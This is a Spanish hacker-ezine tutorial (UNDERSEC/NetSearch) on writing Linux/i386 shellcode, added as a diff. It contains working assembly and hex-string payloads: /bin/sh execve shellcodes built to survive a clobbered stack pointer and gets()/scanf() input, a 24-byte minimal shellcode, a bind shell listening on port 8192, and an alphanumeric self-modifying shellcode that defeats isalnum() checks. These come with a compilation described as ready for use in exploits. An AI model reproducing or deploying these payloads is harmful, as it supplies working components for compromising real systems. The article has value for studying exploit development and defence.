@@ -1,0 +1,878 @@
+=-[ UNDERSEC Security TEAM ]-================================================
+=-[ Shellcodes en Linux/i386 (2) ]-==========================================
+=-[ por RaiSe ]-=============================================================
+
+
+
+
+----------------
+// 0.- Indice
+----------------
+
+
+0.-  Indice
+1.-  Prologo
+2.-  '%esp' sobreescrito
+3.-  Shellcode sin retornos de linea
+4.-  Syscall's de mas de 5 argumentos
+5.-  Minishellcode
+6.-  Enlazar un puerto con una shell usando sockets
+7.-  Pasando el codigo a un string
+8.-  Shellcode alfanumerica
+9.-  Recopilacion de shellcodes / extractor
+10.- Despedida
+
+
+
+----------------
+// 1.- Prologo
+----------------
+
+
+Vista la buena acogida que ha tenido el articulo de shellcodes de NS #4 he
+tomado la decision de hacer una segunda parte :). En este texto intentare
+profundizar un poco mas en las shellcodes, con algunos casos concretos que
+nos serviran especificamente para algunos xploits, asi como alguna que otra
+shellcode un poco mas compleja ;). Se recomienda leer la primera parte sino
+estas familiarizado con las scodes (http://netsearch.page.to/ns004.zip). En
+los diferentes apartados del articulo voy poniendo los codigos de las
+shellcodes. El penultimo apartado es una recopilacion de las scodes en
+strings listas para ser usadas.
+
+
+
+----------------------------
+// 2.- '%esp' sobreescrito
+----------------------------
+
+
+Este caso se da cuando el registro esp (puntero al tope de la pila) ha
+sido sobreescrito por cualquier motivo aleatorio. Un caso muy tipico es
+cuando sobreescribimos una variable del tipo jmp_buf.. sino calculamos
+exactamente lo que debemos sobreescribir lo mas probable es que 'machaquemos'
+esp con un valor fuera del segmento actual. Al hacerlo conseguimos que el 90%
+de las shellcodes no funcionen, ya que cuando hagamos la llamada a 'call'
+para salvar la direccion del string en la pila, el sistema intenta guardarlo
+en el tope de la pila (esp), que como apunta a una direccion erronea dara un
+segment fault. La solucion a esto es muy sencilla, y consiste en copiar
+nosotros manualmente a esp una constante que siempre estara dentro de la
+pila, por ejemplo 0xbffffff0.
+
+Pues bien, el nuevo aspecto de la tipica shellcode que ejecuta '/bin/sh'
+seria algo asi:
+
+
+<-- codigo -->
+
+__asm__("
+       jmp 0x1f
+       popl %edi
+       movl %edi,%ebx
+       xorl %eax,%eax
+       movb %al,0x7(%edi)
+       movl %edi,0x8(%edi)
+       movl %eax,0xc(%edi)
+       leal 0x8(%edi),%ecx
+       leal 0xc(%edi),%edx
+       movb $0xb,%al
+       int $0x80
+       xorl %ebx,%ebx
+       movl %ebx,%eax
+       inc %eax
+       int $0x80
+       movl $0xbffffff0,%esp
+       call -0x29
+       .string \"/bin/sh\"
+");
+
+<-- fin codigo -->
+
+
+Como veis es muy sencilla la solucion :).
+
+
+
+----------------------------------------
+// 3.- Shellcode sin retornos de linea
+----------------------------------------
+
+
+Hay veces que necesitamos tener la shellcode en una sola linea sin retornos
+de carro ni nada parecido. Un caso muy claro de esto es cuando el programa
+vulnerable utiliza una llamada a 'gets()' para leer el string que luego se
+copiara a un buffer, etc. En este caso si la shellcode contienen un retorno
+de linea el programa finalizara la ejecucion de 'gets()' y la scode quedara
+a medias, siendo obvio que cuando se ejecute no funcionara correctamente..
+
+En otras ocasiones, aun teniendo una scode sin retornos de linea no es
+suficiente. Me estoy refiriendo a cuando el programa vulnerable lee los datos
+con una llamada a 'scanf()'. Como todos sabemos, scanf solo lee hasta que se
+encuentra un retorno de linea o un espacio en blaco. Resumiendo, necesitamos
+una shellcode que no contenga ni retornos de linea ni espacios en blanco. La
+lista de caracteres que no debe tener es la siguiente:
+
+	. Retornos de linea:
+
+	  + '\f', 0x0c, salto de pagina.
+	  + '\n', 0x0a, salto de linea.
+	  + '\r', 0x0d, salto de carro.
+	  + '\v', 0x0b, tabulacion vertical.
+
+	. Espacios:
+
+	  + '\b', 0x08, espacio atras.
+	  + '\t', 0x09, tabulacion horizontal.
+	  + '  ', 0x20, espacio en blanco.
+
+
+Normalmente la tipica shellcode que ejecuta una shell contiene 2 saltos de
+linea, 1 tabulacion vertical y 2 espacios atras. La solucion consiste en
+cambiar las instruccion conflictivas por otras cuyos 'opcodes' no tengan esos
+valores. La instrucciones en cuestion son las siguientes (estan sacadas de
+un codigo mas o menos standard de un execve /bin/sh):
+
+
++ mov    %eax,0xc(%esi)   -->  1 salto de linea
++ lea    0xc(%esi),%edx   -->  1 salto de linea
++ mov    $0xb,%al         -->  1 tabulacion vertical
++ mov    %esi,0x8(%esi)   -->  1 espacio atras
++ lea    0x8(%esi),%ecx   -->  1 espacio atras
+
+
+Pues bien, se cambian esas instrucciones por otras que consigan el mismo
+resultado y ya esta.. El codigo cambiado seria algo asi:
+
+
+<-- codigo -->
+
+__asm__("
+        jmp   0x19
+        popl  %edi
+        movl  %edi,0x10(%edi)
+        xorl  %edx,%edx
+        movb  %dl,0x7(%edi)
+        movl  %edx,0x14(%edi)
+        movl  %edi,%ebx
+        leal  0x50(%edx),%eax
+        leal  0x10(%edi),%ecx
+        subl  $0x45,%eax
+        int   $0x80
+        call  -0x1e
+        .string \"/bin/sh\"
+");
+
+<-- fin codigo -->
+
+
+Simplemente se ha cambiado el registro %esi por %edi, el metodo de poner %eax
+a 0xb y poco mas. Y nada.. ya esta la shellcode lista para ser usada.. ;).
+
+
+
+-----------------------------------------
+// 4.- Syscall's de mas de 5 argumentos
+-----------------------------------------
+
+
+En el articulo anterior solo habiamos tratado las shellcodes que utilizaban
+syscalls con 5 argumentos como maximo. Haciendo un poco de memoria podemos
+recordar que se ponia el numero de syscall en %eax, y los argumentos se iban
+colocando en los registros consecutivamente de esta forma:
+
+-> %ebx, %ecx, %edx, %esi, %edi
+
+Pues bien, para utilizar una syscall con mas de 5 argumentos, como veremos,
+es muy sencillo. Simplemente hay que colocar el numero de la syscall en %eax
+(esto no cambia), y la lista de argumentos en un array (terminado en un long
+null). La direccion del array se coloca en %ebx. Queria poner un ejemplo pero
+es que no se que syscall poner que utilice mas de 5 argumentos.. Bueno, pues
+nada.. simplemente se ponen los argumentos en un array y se copia la
+direccion a %ebx y en %eax el numero de syscall. La estructura quedaria algo
+asi:
+
+%eax -> 0xn  (n es el numero de la syscall, /usr/include/asm/unistd.h) 
+%ebx -> 0xbfffffa0
+
+(0xbfffffa0) -> 0x00000001 0xbffffff5 .. 0x00000000 (es un caso hipotetico)
+int  $0x80
+
+
+
+----------------------
+// 5.- Minishellcode
+----------------------
+
+
+Hay veces que a la hora de xplotar un programa tenemos tan poca cantidad de
+memoria, que la longitud de la shellcode se convierte en algo critico. Por lo
+tanto lo logico es que cuanto menor sea la shellcode, pues mejor. En casos
+cuando el buffer a sobreescribir tiene un tamaño de 32 bytes por ejemplo,
+necesitamos una scode de unos 36 bytes como maximo, ya que el tamaño que
+tendremos sera: tamaño_del_buffer + 4 (%ebp). Pero en ese caso solo podriamos
+copiar la direccion de retorno una vez, ya que no tendriamos espacio para
+mas.. y tampoco podriamos poner ningun nop (por la misma razon).
+
+Entonces el tamaño de la scode deberia ser de unos 36-12 mas o menos.. asi
+podriamos copiar la direccion de retorno 3 veces, o copiarla 2 veces y poner
+4 nops.. Y ahi es cuando empezamos a optimizar el codigo lo maximo posible
+para reducir el tamaño.
+
+Lo primero que haremos (resulta obvio), es quitar la llamada a 'exit', ya que
+si la shellcode funciona no nos hara falta para nada. Despues cambiamos unas
+instrucciones por otras que ocupan menos bytes y que hacen lo mismo, como por
+ejemplo usar el stack con push's para colocar el string, en vez del tipico
+jmp-call. Despues cambiamos un movl por un leal y poco mas.. El path a
+ejecutar es //bin/sh, no quito una barra porque con dos funciona
+perfectamente y estariamos gastando 1 byte mas. El resultado es una shellcode
+de 24 bytes que ejecuta una shell. El codigo seria algo asi:
+
+
+<-- codigo -->
+
+__asm__("
+        xorl  %edx,%edx
+        pushl %edx
+        pushl $0x68732f6e
+        pushl $0x69622f2f
+        movl  %esp,%ebx
+        pushl %edx
+        pushl %ebx
+        movl  %esp,%ecx
+        leal  0xb(%edx),%eax
+        int   $0x80
+");
+
+<-- fin codigo -->
+
+
+Despues de darle mil vueltas no he conseguido reducirla mas, si alguien sabe
+como que me mande un mail a raise@netsearch-ezine.com please ;).
+
+
+
+-------------------------------------------------------
+// 6.- Enlazar un puerto con una shell usando sockets
+-------------------------------------------------------
+
+
+Pues bien, esta es una shellcode que enlaza un puerto con una shell como muy
+bien dice el titulo de este apartado (vease 3 lineas para arriba ;) ). La
+verdad es que no tiene ningun misterio, simplemente hay que saber un par de
+cosas a la hora de usar sockets..
+
+
++ El codigo de la syscall siempre sera 0x66 y se coloca en %eax
+
++ En %ebx se coloca el codigo de la subrutina, que puede mirarse en
+  /usr/include/linux/net.h.
+
++ En %ecx se coloca la direccion de la lista de argumentos. Este caso en
+  un tanto especial ya que la lista no tiene que estar terminada por un nulo,
+  sino que se encarga el sistema de saber cuantos argumentos necesita cada
+  syscall.
+
++ La estructura sockaddr_in se consigue copiando los valores de cada elemento
+  en en forma de media palabra (2 bytes).
+
++ La syscall definitiva se ejecuta con int $0x80 (esto tampoco cambia).
+
+
+La manera de enlazar el puerto con la scode se consigue ejecutando una serie
+de syscall's consecutivamente:
+
+
+     +--------------------------------------------------------+
+     |                                                        |
+     |	fork() -> exit() proceso padre -> socket() -> bind()  |
+     |	       -> listen() -> accept() -> dup2() -> execve()  |
+     |                                                        |
+     +--------------------------------------------------------+
+
+
+Asi, resumido brevemente, seria crear un proceso con fork, crear un socket
+con idem, enlazar el socket con bind, ponerlo a la escucha con listen,
+aceptar 'una' conexion con accept, redireccionar las entradas/salidas con
+dup2 hacia el socket, y ejecutar una shell. Es importante recalcar que el
+codigo no vuelve a ejecutar accept() una y otra vez con un bucle, sino que en
+cuanto se establezca una conexion con el puerto en cuestion y se termine la
+comunicacion, el proceso desaparecera y no se podra volver a conectar.
+
+El codigo en C mas sencillo para hacer esto seria mas o
+menos el siguiente:
+
+
+<-- codigo C -->
+
+int soc_local,soc_remoto;	// declarar los sockets
+struct sockaddr_in addr_l;	// declarar la estructura sockaddr_in
+
+soc_local=socket(2,1,0);	// crear el socket
+addr_l.sin_family = 2;		// family = AF_INET
+addr_l.sin_port = 0x20;		// puerto 0x2000 = 8192
+addr_l.sin_addr.s_addr = 0;	// s_addr = INADDR_ANY
+
+bind(soc_local,(struct sockaddr *) &addr_l, 0x10);  // enlazar el socket
+listen(soc_local,1);		// poner el socket a la escucha
+soc_remoto=accept(soc_local,0, 0);  // aceptar conexion 
+
+dup2(soc_remoto,0);		
+dup2(soc_remoto,1);		//  duplicar descriptores
+dup2(soc_remoto,2);		
+execl("/bin/sh","sh",0);	//  ejecutar /bin/sh
+
+<-- fin codigo C -->
+
+
+El codigo en asm seria el siguiente (el codigo esta sin optimizar,
+seguramente sobraran unos 50 bytes..):
+
+
+<-- codigo -->
+
+__asm__("
+
+decl %esp			// decrementa %esp
+decl %esp			// decrementa %esp
+decl %esp			// decrementa %esp
+decl %esp			// decrementa %esp
+popl %edi			// copia la dire de retorno de la funcion
+				// anterior en %edi (dicha direccion siempre
+				// estara en %esp-4 sino se toco nada de la
+				// pila despues del ret).
+
+movl %edi,%esp			// copia %edi a %esp, esto se hace para
+				// poder hacer push's a saco sin preocupar-
+				// nos de sobreescribir la shellcode, ya
+				// que %esp siempre apuntara 'por encima'
+				// de la shellcode.
+// fork
+xorl %eax,%eax			// pone %eax a 0
+movl %eax,%ebx			// copia %eax a %ebx, %ebx=0
+movb $0x2,%al			// %eax=0x2 (fork)
+int  $0x80			// ejecuta el fork()
+cmpl %eax,%ebx			// compara si %eax es 0
+je   0x5			// si %eax=0 salta el exit() que viene a
+				// continuacion
+// exit
+leal 0x1(%ebx),%eax		// pone %eax a 0x1 (exit)
+int  $0x80			// ejecuta exit() (proceso padre)
+
+// socket
+xorl %edx,%edx			// pone %edx a 0
+movl %edx,0x8(%edi)		// copia un long null a la dire %edi+8
+incl %edx			// %edx=1
+movl %edx,0x4(%edi)		// copia 0x00000001 a la dire %edi+4
+incl %edx			// %edx=2
+movl %edx,(%edi)		// copia 0x00000002 a la dire %edi	
+movl %edi,%ecx			// copia %edi a %ecx
+xorl %ebx,%ebx			// pone %ebx a 0
+incl %ebx			// pone %ebx a 1 (socket)
+leal 0x65(%ebx),%eax		// pone %eax a 0x66
+int  $0x80			// ejecuta socket(2,1,0)
+
+// bind
+movl %eax,%esi			// copia 'soc_local' en %esi
+xorl %edx,%edx			// pone %edx a 0
+movl %edx,(%edi)		// copia un long null a la dire %edi
+movb $0x2,(%edi)		// pone 0x0002 en la dire %edi (1 hword)
+movb $0x20,0x2(%edi)		// pone 0x20 en la dire %edi+2
+movl %edx,0x4(%edi)		// copia un long null a la dire %edi+4
+movl %esi,0x8(%edi)		// copia 'soc_local' a la dire %edi+8
+movl %edi,0xc(%edi)		// copia la dire de sockaddr_in a %edi+0xc
+movl %edx,0x10(%edi)		// copia un long null a la dire %edi+0x10
+movb $0x10,0x10(%edi)		// pone en la dire %edi+0x10 0x00000010
+				// Con esto estamos declarando la lista de
+				// argumentos de bind(). La direccion de
+				// dicha lista se copiara a %ecx.
+leal 0x66(%edx),%eax		// pone %eax=0x66
+leal 0x2(%edx),%ebx		// %ebx=2 (bind)
+leal 0x8(%edi),%ecx		// carga la dire de sockaddr_in en %ecx
+int  $0x80			// ejecuta bind()
+
+// listen
+movl %esi,(%edi)		// copia 'soc_local' a la dire %edi
+movl %edx,0x4(%edi)		// long null a la dire %edi+4
+movb $0x1,0x4(%edi)		// 0x00000001 en la dire %edi+4
+leal 0x66(%edx),%eax		// carga 0x66 en %eax
+leal 0x4(%edx),%ebx		// %ebx = 4 (listen)
+movl %edi,%ecx			// lista de argumentos en %ecx
+int  $0x80			// ejecuta listen()
+
+// accept
+movl %edx,0x4(%edi)		// long null a la dire %edi+4
+movl %edx,0x8(%edi)		// long null a la dire %edi+8
+				// en la dire %edi sigue estando soc_local
+leal 0x66(%edx),%eax		// %eax=0x66
+leal 0x5(%edx),%ebx		// %ebx = 5 (accept)
+int  $0x80			// ejecuta accept()
+
+// dup2
+movl %eax,%ebx			// copia 'soc_remoto' a %ebx
+xorl %ecx,%ecx			// %ecx = 0
+leal 0x3f(%edx),%eax		// %eax = 0x3f (dup2)
+int  $0x80			// ejecuta dup2(soc_remoto,0)
+leal 0x3f(%edx),%eax	        // %eax = 0x3f (dup2)
+incl %ecx			// incrementa en 1 %ecx
+int  $0x80			// ejecuta dup2(soc_remoto,1)
+leal 0x3f(%edx),%eax		// %eax = 0x3f (dup2)
+incl %ecx			// incrementa en 1 %ecx
+int  $0x80			// ejecuta dup2(soc_remoto,2)
+
+// execve
+xorl  %edx,%edx			// %edx=0
+pushl %edx			// long null a la pila	
+pushl $0x68732f6e		//
+pushl $0x69622f2f		// coloca el string /bin/sh seguido del
+				// nulo q pusimos antes (pushl %edx) en
+				// la pila.	
+movl  %esp,%ebx			// carga la dire del string en %ebx
+pushl %edx			// long null a la pila
+pushl %ebx			// dire del string a la pila
+movl  %esp,%ecx			// carga la dire de los args en %ecx
+leal  0xb(%edx),%eax		// %eax=0xb
+int   $0x80                    	// ejecuta execve()
+
+");
+
+<-- fin codigo -->
+
+
+Una vez que se ejecute abrira un puerto (segun esta configurada el 8192) y
+aceptara UNA conexion, despues se cerrara el puerto y adios muy buenas.. Si
+quieres mejorar esta shellcode no dudes en mandarme un mail ;).
+
+
+
+--------------------------------------
+// 7.- Pasando el codigo a un string
+--------------------------------------
+
+
+En el articulo anterior (NS #4), habia dicho como pasar la shellcode a un
+string manualmente, pero eso la verdad es que es un poco/bastante rollazo si
+la shellcode tiene unas dimensiones un poco grandes. Para facilitar la tarea
+he creado una funcion que te lo pasa automaticamente y te hace un print de la
+scode bastante mono..
+
+La forma de utilizarlo es la sencilla. La estructura del programa en C con el
+codigo de la scode tiene que tener un estilo de este tipo:
+
+
+<-- codigo -->
+
+#include ..tal..
+#include <scodes.h>
+
+void shellcode()
+	{
+	__asm__("
+		codigo de la shellcode
+		.byte 0x00
+		");
+	}
+
+main()
+	{
+	printsc((int)shellcode);
+	}
+
+<-- fin codigo -->	
+
+
+La funcion printsc() esta declarada en el fichero scodes.h que se incluye al
+final de este articulo (apartado recopilacion). La forma de llamar a dicha
+funcion es la siguiente:
+
+
+		printsc((int)dire_funcion_scode); 
+
+
+Resumiendo, se mete el codigo de la shellcode en una funcion que solo
+contenga un __asm__() con el code terminado de un null (.byte 0x00). Esto
+ultimo es importante ya que sino lo ponemos la scode sera mas larga de lo que
+deberia (se pasara al string el codigo del __asm__ y lo que haya a
+continuacion), por lo tanto hay que poner el .byte 0x00 para diferenciar cual
+es el final de nuestro codigo. El file scodes.h se copia a /usr/includes y se
+incluye en nuestro prog con #include <scodes.h>.
+
+La scode se muestra por pantalla ordenada y esop, luego solo es cuestion de
+cut & paste ;).
+
+
+
+-------------------------------
+// 8.- Shellcode alfanumerica
+-------------------------------
+
+
+Hay algunas veces que necesitamos una scode que solo contenga valores
+alfanumericos una vez 'printeada', es decir solamente letras (mayusculas,
+minisculas, y numeros). Un caso muy tipico podria ser un programa 'xplotable'
+donde no tuvieramos sitio para poner la scode, a excepcion de una funcion
+donde tenemos sitio pero que hace chequeo de valores alfanumeros por medio de
+la funcion isalnum().
+
+La solucion obvia pasa por tener un codigo que ejecute una shell (o cualquier
+otra cosa de la que saquemos provecho), y que sea capaz de pasar por un
+chequeo de isalnum(). En este caso particular veremos una sc que ejecuta un
+execve() de /bin/sh, pero se pueden hacer mas cosas.
+
+Para conseguir un codigo que no tenga ningun opcode (opcode es el valor en
+hexadecimal de cada intruccion en asm) no printeable, tendremos que recurrir
+a ciertas artimañanas.. Para empezar la mayoria de instrucciones como xorl
+%eax,%eax, movl %eax,%edx no se podran usar, asi que hay que usar 
+otras. Bueno, lo mejor sera que pegue la scode y vaya comentandola brevemente
+linea por linea :).
+
+Tengo que decir que el metodo de los nops alfanumericos lo ha desarrollado
+Fatuo (Fuego Fatuo - leonardo@hispasecurity.com), aparte de alguna que otra
+scode alfanumerica tambien.
+
+Dicho metodo consiste en sobreescribir %ebp con la direccion de retorno
+(normalmente casi siempre se sobreescribe en los stack overflow normales), y
+luego en vez de poner nops poner 'incl %ebp' -> caracter 'E'. De esta forma
+se calcula la direccion de retorno exacta donde terminan los 'nops' y empieza
+la shellcode. Dicha direccion hay que saberla exacta por el tema de
+automodificacion de codigo que se vera mas adelante. Tambien hay otro metodo
+un poco mas burro con el cual no hace falta sobreescribir %ebp, pero tiene
+ciertas limitaciones como el numero de nops a poner y el tamaño. Yo tenia
+desarrollada una sc con ese metodo que admitia 200 nops y tenia un tamaño de
+392 bytes creo q eran.. pero hay que reconocer que mola mas este metodo asi
+que hice una scode optimizada y se kedo en 88 bytes :).
+
+Para copiar un registro a otro, al no poder usar mov's, tendremos que
+hacerlo con xor's. La teoria es que si tenemos 2 valores, pongamos A y B,
+haciendo lo siguiente quedaria tal que asi:
+
+A xor B = C    (C es el resultado)
+C xor A = B
+C xor B = A
+
+Veamoslo con numeros:
+
+5 xor 2 = 7
+7 xor 5 = 2
+7 xor 2 = 5
+
+Por lo tanto, si queremos copiar %eax a %edi, usaremos una memoria intermedia
+que sepamos que no contiene codigo de la scode, de la siguiente forma:
+
+xorl 0x60(%ebp) , %eax		
+xorl %eax , 0x60(%ebp)   -> aqui hemos copiado %eax a la dire 0x60(%ebp)
+xorl %edi , 0x60(%ebp)
+xorl 0x60(%ebp) , %edi   -> ya tenemos %eax en %edi
+
+
+Bueno, y ahora ya empecemos con la scode :)..
+
+
++ <dec   %esp>
+. Decrementa en 1 unidad %esp.
+
++ <dec   %esp>
+. Idem.
+
++ <dec   %esp>
+. Idem.
+
++ <dec   %esp>
+. Idem XD. Restamos 4 a %esp en total.
+
++ <popl  %eax>
+. Salvamos la direccion de retorno de la funcion anterior en %eax.
+
++ <xorl  0x58(%ebp),%eax>
+. Vamos a utilizar una direccion intermedia para copiar %eax a %esp.
+
++ <xorl  %eax,0x58(%ebp)>
+. Ya tenemos %eax en la dire %ebp+0x58.
+
++ <xorl  %esp,0x58(%ebp)>
+. Primer paso para copiar el contenido de %ebp+58 a %esp.
+
++ <xorl  0x58(%ebp),%esp>
+. Ya tenemos copiado %ebp+0x58 (%eax) en %esp. Esto se hace para que no
+sobreescribamos la propia shellcode cuando mas tarde hagamos unos cuantos
+push's. De esta forma los push's siempre iran 'por encima' de la scode y no
+habra peligro de sobreescribir nada importante.
+
++ <push  $0x45>
+. Guardamos el valor 0x00000045 en la pila.
+
++ <popl  %eax>
+. Ponemos %eax a 0x00000045
+
++ <xorb  $0x45,%al>
+. Ponemos %eax a cero (0x00000000)
+
++ <pushl %eax>
+. Ponemos un long null en la pila
+
++ <push  $0x68736538>
+. Guardamos lo q sera parte del string '/bin/sh'
+
++ <popl  %eax>
+. Recuperamos en %eax lo q sera parte del string '/bin/sh'
+
++ <xorw  $0x4a56,%ax>
+. Modificamos el contenido de %ax para conseguir el string
+
++ <pushl %eax>
+. Lo colocamos en la pila (recordemos que detras hay un long null)
+
++ <pushl $0x69626565>
+. Segunda parte de lo que sera el string '/bin/sh'
+
++ <popl  %eax>
+. Lo recuperamos en %eax (idem que antes)
+
++ <xorw  $0x4a4a,%ax>
+. Lo modificamos con un xor (idem de idem)
+
++ <pushl %eax>
+. Lo ponemos en la pila. Ahora tenemos en memoria //bin/sh0x00000000
+
++ <push  %esp>
+. Salvamos la direccion del string
+
++ <popl  %ecx>
+. Recuperamos la direccion del string en %ecx
+
++ <push  $0x59>
+. Primera parte del procedimiento para poner %eax a cero
+
++ <popl  %eax>
+. Guardamos 0x00000059 en %eax
+
++ <xorb  $0x59,%al>
+. %eax = long null
+
++ <push  %eax>
+. Ponemos un long null en la pila
+
++ <push  %ecx>
+. Ponemos la dire del string en la pila
+
++ <push  %esp>
+. Ponemos la dire del array (dire_string,null) en la pila (*argv[])
+
++ <push  %eax>
+. Guardamos un long null en la pila
+
++ <push  %ebp>
+. Guardamos la direccion del principio de la shellcode en la pila. Recordemos
+que %ebp teoricamente contiene la dire exacta de la shellcode, ya que
+sobreescribimos %ebp con la dire de retorno en el xploit, y fuimos
+incrementandolo con los nops.
+
++ <popl  %eax>
+. Recupera la direccion de la shellcode en %eax.
+
++ <xorl  0x58(%eax),%ecx>
+. Procedimiento para mover %ecx a %ebx usando una direccion intermedia, %ecx
+contiene la direccion del string '/bin/sh'.
+
++ <xorl  %ecx,0x58(%eax)>
+. Con esto coloca %ecx en la direccion %eax+0x58 (direccion que no contiene
+codigo de la scode, por lo tanto no nos importa lo que sobreescribamos).
+
++ <xorl  %ebx,0x58(%eax)>
+. Procedimiento igual pero ahora con %ebx.
+
++ <xorl  0x58(%eax),%ebx>
+. Copiamos el contenido de la dire %eax+0x58 a %ebx. Es decir, ya tenemos
+%ecx en %ebx (la dire del string).
+
++ <popl  %edx>
+. Recupera un long null en %edx que habiamos guardao hace mil años XD.
+
++ <popl  %ecx>
+. Recupera la direccion del array *argv[] en %ecx que tambien habiamos
+guardao hace mil años.
+
++ <dec   %edx>
+. Decremante %edx, ahora vale 0xffffffff
+
++ <xorw  %dx,0x56(%ebp)>
+. Procedimiento de automodificacion de codigo. Con esto conseguiremos cambiar
+el byte 0x32 que esta mas abajo en memoria (dire %ebp+0x56 para ser
+exactos) por 0xcd (primer byte de int $0x80). Y dejamos preparado el byte
+0x47 para convertirlo con un segundo xor en 0x80.
+
++ <inc   %edx>
+. Volvemos a poner %edx a cero.
+
++ <push  $0x38>
+. Ponemos el byte 0x38 en la pila.
+
++ <popl  %eax>
+. %eax = 0x00000038
+
++ <xorb  %al,0x57(%ebp)>
+. Convertimos el byte que antes era 0x47 a 0x80, con lo que cuando se
+ejecuten esos 2 bytes se ejecutara int $0x80. Hemos convertido los bytes 0x32
+y 0x47 en 0xcd y 0x80 (opcodes de int $0x80).
+
++ <xorb  $0x33,%al>
+. Ponemos %al a 0x0b (0x38 xor 0x33 = 0xb).
+
++ <.byte 0x32>
+. Byte que sera/ha sido convertido a 0xcd
+
++ <.byte 0x47>
+. Byte que sera/ha sido convertido a 0x80.
+
+
+Y ya esta, a que no ha sido tan dificil? :). Con esto conseguimos una
+shellcode alfanumerica totalmente funcional y que permite nops infinitos,
+con un tamaño de 88 bytes.
+
+
+
+-----------------------------------------------
+// 9.- Recopilacion de shellcodes / extractor
+-----------------------------------------------
+
+
+Aqui pego una recopilacion de scodes listas para ser usadas. Para
+'extraerlas': nextract archivo.txt. Por cierto que todas son made by RaiSe
+(algunas como la alfanumerica compartiendo ideas con Zer0 y Fatuo ;) ).
+
+
+<++> shellcodes/sc-esp.c $8308a7a77bbe3103152344e40da5df0d
+
+// scode '%esp' sobreescrito
+
+char shellc[128]=
+"\xeb\x1f\x5f\x89\xfb\x31\xc0\x88\x47\x07\x89\x7f\x08\x89\x47"
+"\x0c\x8d\x4f\x08\x8d\x57\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8"
+"\x40\xcd\x80\xbc\xf0\xff\xff\xbf\xe8\xd7\xff\xff\xff\x2f\x62"
+"\x69\x6e\x2f\x73\x68";
+
+<-->
+
+<++> shellcodes/sc-oneline.c $cfec37c76b30001d337f80e7eb35b206
+
+// scode sin retornos de linea
+
+char shellc[128]=
+"\xeb\x19\x5f\x89\x7f\x10\x31\xd2\x88\x57\x07\x89\x57\x14\x89"
+"\xfb\x8d\x42\x50\x8d\x4f\x10\x83\xe8\x45\xcd\x80\xe8\xe2\xff"
+"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+<-->
+
+<++> shellcodes/sc-mini.c $9d747e94e6be0a71682e2dd1ab6b77d8
+
+// miniscode, 24 bytes
+
+char shellc[128]=
+"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
+
+<-->
+
+<++> shellcodes/sc-portshell.c $ecba7d17930eb1b3d596b5eb21c431ce
+
+// scode que enlaza una shell en el puerto 8192
+
+char shellc[512]=
+"\x4c\x4c\x4c\x4c\x5f\x89\xfc\x31\xc0\x89\xc3\xb0\x02\xcd\x80"
+"\x39\xc3\x74\x05\x8d\x43\x01\xcd\x80\x31\xd2\x89\x57\x08\x42"
+"\x89\x57\x04\x42\x89\x17\x89\xf9\x31\xdb\x43\x8d\x43\x65\xcd"
+"\x80\x89\xc6\x31\xd2\x89\x17\xc6\x07\x02\xc6\x47\x02\x20\x89"
+"\x57\x04\x89\x77\x08\x89\x7f\x0c\x89\x57\x10\xc6\x47\x10\x10"
+"\x8d\x42\x66\x8d\x5a\x02\x8d\x4f\x08\xcd\x80\x89\x37\x89\x57"
+"\x04\xc6\x47\x07\x01\x8d\x42\x66\x8d\x5a\x04\x89\xf9\xcd\x80"
+"\x89\x57\x04\x89\x57\x08\x8d\x42\x66\x8d\x5a\x05\xcd\x80\x89"
+"\xc3\x31\xc9\x8d\x42\x3f\xcd\x80\x8d\x42\x3f\x41\xcd\x80\x8d"
+"\x42\x3f\x41\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f"
+"\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
+
+<-->
+
+<++> shellcodes/sc-alfa.c $f9c01b11bf127c80454b55d2ea3525ef
+
+// scode alfanumerica
+// nop is 'E'
+
+char shellc[128]=
+"LLLLX3EX1EX1eX3eXjEX4EPh8eshXf5VJPheebiXf5JJPTYjYX4YPQTPUX"
+"3HX1HX1XX3XXZYJf1UVBj8X0EW432G";
+
+<-->
+
+<++> shellcodes/scodes.h $7986750a103954c2ac983bee2abd34cd
+// Extractor de shellcodes by RaiSe
+// NetSearch Ezine
+// Testeado en redhat 6.0
+
+
+#define SIZE 2048
+
+int printsc (int funcion)
+{
+int i,cc;
+char dst[SIZE],buf[SIZE],*p;
+
+p=(char *)funcion;
+sprintf(buf,"%s",p);
+p=dst;
+
+printf("\nExtractor de shellcodes");
+printf("\nRaiSe - NetSearch Ezine\nhttp://www.netsearch-ezine.com\n");
+
+for(i=3;i<strlen(buf);i++)
+	{
+	sprintf(p,"%08x",buf[i]);
+	*p=*(p+6);
+	*(p+1)=*(p+7);
+	p+=2;
+	}
+
+*p=0x00;
+i=0;
+printf("\nchar shellc[]=");
+
+while(dst[i]!=0x00)
+	{
+	printf("\n\"");
+	for(cc=0;cc<15;cc++)
+		{
+		if(dst[i]==0x00)  break;
+		printf("\\x%c%c",dst[i],dst[i+1]);
+		i+=2;
+		}
+	printf("\"");
+	}	
+
+printf(";\n\n");
+return(1);
+
+}
+
+<-->
+
+
+-------------------
+// 10.- Despedida
+-------------------
+
+
+Bueno, y esto ha llegado a su fin. Como suele decirse ha sido un placer
+escribirlo ;). Por desgracia no puedo mandar un saludo a mi novia porque ya
+no la tengo.. cosas que pasan en la vida.. Un saludo muy especial para sp4rk,
+quasar, doing, cafo & company ;).
+
+Nos vemos en NetSearch Ezine #6, hasta pronto.
+
+
+RaiSe
+
+
+
+0x00
+
+-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
+
+
